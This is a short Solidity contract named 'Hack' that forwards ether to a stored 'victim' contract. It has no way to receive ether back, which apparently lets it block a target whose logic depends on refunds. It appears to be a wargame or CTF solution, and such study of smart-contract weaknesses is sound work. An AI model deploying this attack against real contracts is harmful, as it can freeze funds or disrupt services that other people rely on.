//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack{
    address public victim;

    constructor(address _victim){
        victim = _victim;
    }

    function attack() public payable{
        (bool success,) = payable(victim).call{value: msg.value}("");
        require(success);
    }

}